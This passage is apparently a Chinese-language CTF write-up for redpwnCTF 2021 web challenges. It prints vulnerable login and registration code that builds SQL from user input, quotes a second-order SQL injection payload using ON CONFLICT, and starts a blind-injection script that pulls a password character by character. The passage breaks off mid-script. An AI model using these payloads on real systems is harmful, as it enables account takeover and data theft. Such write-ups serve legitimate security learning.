&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;better-sqlite3&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;db.sqlite3&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`DROP TABLE IF EXISTS users;`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`CREATE TABLE users(
&lt;/span>&lt;span style="color:#d88200"> id INTEGER PRIMARY KEY AUTOINCREMENT,
&lt;/span>&lt;span style="color:#d88200"> username TEXT,
&lt;/span>&lt;span style="color:#d88200"> password TEXT
&lt;/span>&lt;span style="color:#d88200">);`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`INSERT INTO users (username, password) VALUES (
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;,
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">randomUUID&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;span style="color:#d88200">)`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;body-parser&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">urlencoded&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">extended&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/?message=Username and password required!&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT id FROM users WHERE
&lt;/span>&lt;span style="color:#d88200"> username = &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39; AND
&lt;/span>&lt;span style="color:#d88200"> password = &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;;`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">prepare&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`/?message=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">FLAG&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Incorrect login&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">`/?message=Incorrect username or password. Query: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰ªñËøô‰∏™b64Âä†ÂØÜÊòØÂèëÁîüÂú®ÂâçÁ´ØÁöÑÔºå‰πüÂ∞±ÊòØÂú®ÂèëÂåÖÁöÑÊó∂ÂÄôÂ∞±Â∑≤ÁªèÂØπpostÁöÑÊï∞ÊçÆËøõË°å‰∫ÜÈ¢ÑÂ§ÑÁêÜÔºåËÄåÂÖ∑‰ΩìÂà∞ÂêéÁ´ØËøõË°åsqlËØ≠Âè•ÁöÑÊü•ËØ¢Êó∂‰ºöÁõ¥Êé•ÊãºÊé•req.body.username/passwdÁöÑÊï∞ÊçÆÔºå‰∏ç‰ºöËøõË°åËøõ‰∏ÄÊ≠•ÁöÑÊ£ÄÊü•ÊàñËøáÊª§&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710104923251.png" alt="image-20210710104923251">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710104859539.png" alt="image-20210710104859539">&lt;/p>
&lt;p>ÂàöÂºÄÂßãÊÉ≥Â§çÊùÇ‰∫Ü&lt;/p>
&lt;h2 id="webcool">web/cool&lt;/h2>
&lt;blockquote>
&lt;p>Aaron has a message for the cool kids. For support, DM BrownieInMotion.&lt;/p>
&lt;p>&lt;a href="https://cool.mc.ax/">cool.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/e03916d52bb7e84cbd2f9f26e5de162fdd0442c40d8397a103aab5813031fd83/app.py">app.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ÁôªÂΩïÊ°ÜÔºåÂèØ‰ª•Ê≥®ÂÜå ÂÖàÂ∞ùËØïtest: test ÁôªÂΩïÊàêÂäü‰ΩÜÊòØÊó†Ê≥ïËé∑Âèñ‰ø°ÊÅØÔºàÊ≥®ÂÜåÂêé‰πü‰ºöË∑≥ËΩ¨Ëøô‰∏™È°µÈù¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710105453861.png" alt="image-20210710105453861">&lt;/p>
&lt;p>ÁïôÊÑècookieÈÉ®ÂàÜÔºåÊòØÁÜüÊÇâÁöÑflask sessionÔºåÊâîËøõÂ∑•ÂÖ∑ÈáåËß£ÂØÜ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710105534823.png" alt="image-20210710105534823">&lt;/p>
&lt;p>ÂÜçÂèÇËÄÉÊ∫êÁ†Å‰∏≠ÁöÑ/messageÈÉ®ÂàÜÔºåËÄÉËôëÂ∞ÜsessionËÆæ‰∏∫{&amp;ldquo;username&amp;rdquo;:&amp;ldquo;ginkoid&amp;rdquo;}ÂêéÁôªÂÖ•Êü•Áúã‰ø°ÊÅØÔºàÂºÄÂßã‰ª•‰∏∫ÊòØsession‰º™ÈÄ† ÂêéÊù•ÂèëÁé∞‰∏çÊòØÔºâ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710113131546.png" alt="image-20210710113131546">&lt;/p>
&lt;p>Áúã‰∏Ä‰∏ãÂÖ∂‰ªñÈÉ®ÂàÜÁöÑÊ∫êÁ†ÅÔºåÈ¶ñÂÖàÊòØinit()&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#75715e"># this is terrible but who cares&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> CREATE TABLE IF NOT EXISTS users (
&lt;/span>&lt;span style="color:#d88200"> username TEXT PRIMARY KEY,
&lt;/span>&lt;span style="color:#d88200"> password TEXT
&lt;/span>&lt;span style="color:#d88200"> );
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;DROP TABLE users;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> CREATE TABLE users (
&lt;/span>&lt;span style="color:#d88200"> username TEXT PRIMARY KEY,
&lt;/span>&lt;span style="color:#d88200"> password TEXT
&lt;/span>&lt;span style="color:#d88200"> );
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># put ginkoid into db&lt;/span>
&lt;span style="color:#111">ginkoid_password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">generate_token&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#39;INSERT OR IGNORE INTO users (username, password)&amp;#39;&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;VALUES (&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">ginkoid&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">ginkoid_password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">);&amp;#39;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;UPDATE users SET password=&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">ginkoid_password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;WHERE username=&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">ginkoid&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">;&amp;#39;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÁÑ∂ÂêéÊòØÂú®ÂàõÂª∫Áî®Êà∑&lt;code>create_user()&lt;/code>ÂíåÁôªÂΩï&lt;code>check_login()&lt;/code>Êó∂ÈÉΩ‰ºöÊ£ÄÊµãÁî®Êà∑Âêç‰∏≠ÊòØÂê¶ÊúâÈùûÊ≥ïÂ≠óÁ¨¶ÔºàÁôΩÂêçÂçïÊòØ26‰∏™Ëã±ÊñáÂ≠óÊØçÂ§ßÂ∞èÂÜôÂíåÊï∞Â≠óÔºâÔºåÁÆóÊòØÊå∫‰∏•Ê†ºÁöÑ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">create_user&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">any&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">allowed_characters&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Alphanumeric usernames only, please.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Username is too short.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Password is too long.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">other_users&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;SELECT * FROM users WHERE username=&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">;&amp;#39;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other_users&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Username taken.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#39;INSERT INTO users (username, password)&amp;#39;&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;VALUES (&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">);&amp;#39;&lt;/span> &lt;span style="color:#75715e"># passwdÈÉ®ÂàÜÂèØÊéß&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ËÄÉËôë‰∫Ü‰∏Ä‰∏ã‰∫åÊ¨°Ê≥®ÂÖ•ÔºåÂõ†‰∏∫Ê≥®ÂÜåÊó∂ÁöÑpasswdÈÉ®ÂàÜÂÆåÂÖ®ÂèØÊéßÔºåËÆæÊÉ≥ÊòØËøôÊ†∑ÁöÑ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710122622508.png" alt="image-20210710122622508">&lt;/p>
&lt;p>ÊûÑÈÄ†passwdÈÉ®ÂàÜ‰∏∫ &lt;code>'),('ginkoid','passwd&lt;/code>&lt;/p>
&lt;p>emmmm ‰ΩÜÊòØËøôÈáå‰∏çÁÆ°ÊòØÊòéÊñáËøòÊòØurl encodeÈÉΩ‰ºöÊúâ500ÈîôËØØÔºåËÄå‰∏îËøôÈáåËøîÂõûÁöÑÊó∂&lt;code>correct_password[0][0]==password&lt;/code>Ôºå‰πüÁÆóÊòØÊùúÁªù‰∫ÜËøôÁßçÂ§öÊ∑ªÂä†‰∏ÄÊù°‰ø°ÊÅØÁöÑÂèØËÉΩÔºå‰πãÂâçÂ∑≤ÁªèÂàùÂßãÂåñÁöÑÂØÜÁ†Å‰ºöÊòØ&lt;code>[0][0]&lt;/code>ÔºåËÄåÊñ∞ÊèíÂÖ•ÁöÑpasswdÂ∞ÜÊòØ&lt;code>[1][0]&lt;/code>ÔºõÂπ∂‰∏îÂú®&lt;code>init()&lt;/code>Êó∂ÂÆö‰πâusernameÊòØprimary ‰πü‰∏çÂèØËÉΩÊúâÈáçÂ§çÁöÑ&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÊØîËµõÁöÑÊó∂ÂÄôÂ∞±ÂÅúÂà∞ËøôÈáå‰∫ÜÔºå‰πüÊòØÂΩìÊó∂‰∫ÜËß£ÁöÑÂ§™Â∞ëÔºåÊÄùË∑ØÂæàÂÆπÊòìÂ∞±Êñ≠Êéâ‰∫Ü„ÄÇ„ÄÇ„ÄÇ‰ª•‰∏ãÊòØÂ§çÁé∞&lt;/p>
&lt;p>Âú®Áúã‰∫Ü&lt;a href="https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md">ËøôÁØáwp&lt;/a>‰πãÂêéÔºåÂèëÁé∞Ëøô‰ΩçÂ∏àÂÇÖÊúÄÂºÄÂßãË∑üÊàëÁöÑÊÄùË∑ØÊòØ‰∏ÄÊ†∑ÁöÑ ÈÉΩÊÉ≥Âà©Áî®insertÈÇ£‰∏ÄÂè•ÔºåÈÉΩÊÉ≥ÊõøÊç¢ÊéâÊï∞ÊçÆÂ∫ì‰∏≠ÂéüÊù•Â≠òÊúâÁöÑginkoidÁöÑÂØÜÁ†ÅÔºõËøô‰ΩçÂ∏àÂÇÖÁî®ÁöÑpayloadÊòØ&lt;/p>
&lt;pre tabindex="0">&lt;code>'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';--
&lt;/code>&lt;/pre>&lt;p>ÂÖ∂‰∏≠ÁöÑ&lt;code>ON CONFLICT DO UPDATE SET&lt;/code>ÔºåÂú®&lt;a href="https://www.sqlite.org/lang_UPSERT.html">ËøôÁØáÂÆòÊñπÊñáÊ°£&lt;/a>ÈáåÂÜôÁöÑÂæàËØ¶ÁªÜÔºåËøô‰ΩçÂ∏àÂÇÖÁªôÁöÑpayloadÂæàÂ•ΩÔºàÊàëÂΩìÊó∂ÂàôÂØπËøô‰∏™sqlËØ≠Âè•Âπ∂‰∏çÊ∏ÖÊ•öÔºâ‰ΩÜÊòØÊ≠£Â¶Ç‰ªñÊâÄËØ¥ÁöÑÔºåwhich is 8 characters over the limit, which won&amp;rsquo;t do.&lt;/p>
&lt;p>ÊúÄÂêé‰ΩøÁî®Áõ≤Ê≥®ÁöÑÊñπÂºèÔºåÂÖà‰∏ä‰∏Ä‰∏ãËÑöÊú¨ Ôºà&lt;a href="https://github.com/SuperStormer/writeups/blob/master/redpwnctf_2021/web/cool.py">ËøôÈáåÊòØÊù•Ê∫ê&lt;/a>ÔºâÂÜçËØ¥ËØ¥ÊÄùË∑Ø&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;https://cool.mc.ax/&amp;#34;&lt;/span>
&lt;span style="color:#75715e"># url = &amp;#34;http://127.0.0.1:5000/&amp;#34;&lt;/span>
&lt;span style="color:#111">prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;asdfjwfoijweoijfojiewfj&amp;#34;&lt;/span>
&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&amp;#34;&lt;/span>
&lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">time&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">time_ns&lt;/span>&lt;span style="color:#111">())&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;0&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># Ê≥®ÊÑèÁôΩÂêçÂçïÈáåÊ≤°Êúâ0 Ë¶ÅÊç¢Êéâ&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;||(select substr(password,&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">,1) from users)||&amp;#39;&amp;#34;&lt;/span>
